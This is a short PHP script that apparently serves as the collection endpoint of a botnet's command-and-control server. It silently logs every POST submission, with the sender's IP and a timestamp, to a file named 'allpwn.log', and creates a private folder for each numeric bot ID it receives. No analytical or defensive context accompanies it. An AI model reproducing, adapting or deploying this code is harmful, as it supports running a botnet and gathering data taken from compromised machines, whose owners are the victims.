<?php
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$datum = Date("j/m/Y H:i:s", Time());

$file = "../../wpwn/allpwn.log";
$fp = fopen("$file", "a");
fwrite($fp, "\n===== LOG: $ip; $datum; =====\n");
fwrite($fp, print_r($_POST,true)); // XXX max size

// test
$botid=$_POST['botid'];
if (preg_match('/^[0-9]*$/D', $botid)) {
// fwrite($fp, "cf: ../../wpwn/cc/$botid\n");
 if (!is_dir("../../wpwn/cc/$botid")) {
  mkdir("../../wpwn/cc/$botid", 0700);
 }
}

fwrite($fp, "\n----- LOG: $ip; $datum; -----\n");
fclose($fp);

// XXX logfile per bot

?>

